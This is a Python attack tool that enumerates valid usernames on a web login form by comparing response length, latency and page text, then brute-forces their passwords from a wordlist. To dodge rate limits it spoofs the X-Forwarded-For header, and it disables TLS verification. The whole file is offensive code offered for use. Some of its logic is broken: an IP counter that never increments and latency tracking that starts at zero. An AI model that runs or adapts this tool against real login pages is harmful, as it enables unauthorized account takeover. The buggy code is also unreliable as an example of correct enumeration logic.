#!/usr/bin/env python3
import re
import time
import sys
import argparse
import requests
from bs4 import BeautifulSoup
from statistics import mean
from concurrent.futures import ThreadPoolExecutor
from collections import Counter, defaultdict


requests.packages.urllib3.disable_warnings()


class Colors:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"


def send_request(url, username, password, ip_suffix):
    headers = {
        "X-Forwarded-For": f"192.168.0.{ip_suffix}"
    }

    data = {
        "username": username,
        "password": password
    }

    start = time.perf_counter()
    r = requests.post(url, data=data, headers=headers, timeout=7, verify=False)
    latency = (time.perf_counter() - start)

    return r, latency


def analyze_latency(base_latency, new_latency, threshold=0.20):
    return new_latency > base_latency * (1 + threshold)


def analyze_length(base_length, new_length, min_diff=10):
    """
    Compare la taille des réponses. 
    Si différence absolue > min_diff => potentiel valid username.
    """
    if abs(new_length - base_length) >= min_diff:
        return True
    return False


def enumerate_users(url, users_list, test_password):
    print(f"{Colors.BLUE}{Colors.BOLD}\n[+] Starting Username Enumeration...{Colors.RESET}\n")
    print(f"{Colors.YELLOW}[i] Using password placeholder: {test_password}{Colors.RESET}")
            
    seen = set()
    results = []
    ip_suffix = 1
    length_counts = defaultdict(int)
    latency_max = 0


    # Base request for comparison
    base_resp, base_latency = send_request(url, "invalid_username_123456", test_password, ip_suffix)
    base_text = base_resp.text
    base_len  = len(base_text)

    print(f"{Colors.CYAN}[i] Base latency: {base_latency:.3f}s  | Base length: {base_len}{Colors.RESET}")

    for user in users_list:
        ip_suffix = +1
        
        try:
            resp, latency = send_request(url, user.strip(), test_password, ip_suffix)
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[ERROR] Request failed for user {user}: {e}{Colors.RESET}")
            continue

        text = resp.text
        length = len(text)

        results.append({
            "username": user,
            "latency": latency,
            "length": length,
            "text": text
        })

        length_counts[length] += 1

        if latency >= latency_max * 1.20:
            latency_max = latency  

    # ======================================================
    #          🔥 POST-ANALYSE POUR DÉTECTER OUTLIERS 🔥
    # ======================================================
    print(f"\n{Colors.BLUE}========= ANALYZING RESULTS ========={Colors.RESET}")

    likely_users = []

 
    for r in results:
        flags = []

        # --- Check latency outlier ---
        if length_counts[r["length"]] == 1:  # seulement une occurrence → outlier
            flags.append(f"length_outlier ({r['length']})")

        if r["latency"] == latency_max:
            flags.append(f"latency_outlier ({r['latency']:.3f}s)")

        anom_rep = detect_anomalous_response(r, seen)

        if anom_rep:
            flags.append("text_differences")

        if flags:
            likely_users.append((r["username"], flags, r))


    print(f"\n{Colors.BLUE}========= SUMMARY ========={Colors.RESET}")

    if not likely_users:
        print(f"{Colors.RED}[!] No anomalies detected.{Colors.RESET}")
        return []
    
    print(f"{Colors.CYAN}[+] POTENTIAL USERS: {Colors.RESET}")
    for user, flags, r in likely_users:
        text_diff_str = f"text_diff={r['text_differences']}" if 'text_differences' in r else ""
        print(f"{Colors.CYAN}   → {user} " +
            f"({', '.join(flags)}) " +
            f"lat={r['latency']:.3f}s len={r['length']} " +
            f"{text_diff_str}{Colors.RESET}"
            )

    return [u for (u, f, r) in likely_users]


def strip_html(text):
    """Enlève les tags HTML et ne garde que le texte brut."""
    clean = re.sub(r"<[^>]*>", "", text)  # remove tags
    return clean.strip()

def detect_anomalous_response(r, seen_fragments):
    """
    Analyse une réponse r et retourne les fragments texte différents par rapport
    à seen_fragments. Ne regarde que les tags visibles dans <body> : h1-h5, p, small, strong.

    Args:
        r (dict): objet résultat avec au moins r["text"] contenant le HTML
        seen_fragments (set): fragments déjà vus

    Returns:
        diff (list): fragments différents (nouveaux)
    """
    text_tags = ["h1", "h2", "h3", "h4", "h5", "p", "small", "strong"]

    soup = BeautifulSoup(r["text"], "html.parser")
    if not soup.body:
        return []

    # Extraire tous les fragments de texte visibles dans le body
    fragments = set()
    for tag_name in text_tags:
        for tag in soup.body.find_all(tag_name):
            text = tag.get_text(strip=True)
            if text:
                fragments.add(text)

    diff = fragments - seen_fragments

    seen_fragments.update(fragments)

    return list(diff)


def brute_force(url, username, pass_list):
    print(f"{Colors.BLUE}{Colors.BOLD}\n[+] Bruteforcing password for {username}{Colors.RESET}")
    
    ip_suffix = 200
    baseline_status = None
    baseline_length = None

    # === Establish baseline with WRONG password ===
    try:
        r0, _ = send_request(url, username, "DefinitelyWrongPassword123!", ip_suffix)
        baseline_status = r0.status_code
        baseline_length = len(r0.text)
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Baseline request failed: {e}{Colors.RESET}")
        return None

    print(f"{Colors.CYAN}[i] Baseline: status={baseline_status}, length={baseline_length}{Colors.RESET}")

    # ==========================
    #       BRUTEFORCE
    # ==========================
    for pwd in pass_list:
        ip_suffix += 1

        try:
            resp, latency = send_request(url, username, pwd.strip(), ip_suffix)
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Request failed for password {pwd}: {e}{Colors.RESET}")
            continue

        code = resp.status_code
        length = len(resp.text)

        # --- CRITERIA FOR SUCCESS ---
        status_flag = (code != baseline_status)
        length_flag = (length != baseline_length)
        redirect_flag = (300 <= code < 400)

        if status_flag or length_flag or redirect_flag:
            print(
                f"{Colors.GREEN}[POSSIBLE MATCH] {username}:{pwd}  "
                f"(code={code}, len={length}, lat={latency:.3f}s){Colors.RESET}"
            )

            # If redirect → almost surely correct
            if redirect_flag:
                print(f"{Colors.GREEN}[SUCCESS] Password for {username} = {pwd}{Colors.RESET}")
                return pwd

            # If length drastically changed → likely correct
            if length_flag:
                print(f"{Colors.GREEN}[LIKELY SUCCESS] Password = {pwd}{Colors.RESET}")
                return pwd

            # If only status changed → suspicious
            if status_flag:
                print(f"{Colors.YELLOW}[CHECK] Status changed for {pwd}, might be valid.{Colors.RESET}")
                return pwd

    print(f"{Colors.RED}[-] No password found...{Colors.RESET}")
    return None



# ==============================
#   MAIN
# ==============================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="User Enumeration & Password Bruteforce Tool")
    parser.add_argument("--target", required=True, help="Target login URL (POST)")
    parser.add_argument("--users", required=True, help="Usernames wordlist")
    parser.add_argument("--passwords", required=True, help="Passwords wordlist")
    parser.add_argument("--testpass", default="test123", help="Password used during enumeration")

    args = parser.parse_args()

    with open(args.users, "r", encoding="utf-8") as f:
        users_list = f.read().splitlines()

    with open(args.passwords, "r", encoding="utf-8") as f:
        pass_list = f.read().splitlines()

    valid_users = enumerate_users(args.target, users_list, args.testpass)

    if not valid_users:
        print(f"{Colors.RED}[!] No valid users detected. Exiting.{Colors.RESET}")
        sys.exit()

    for user in valid_users:
        brute_force(args.target, user, pass_list)
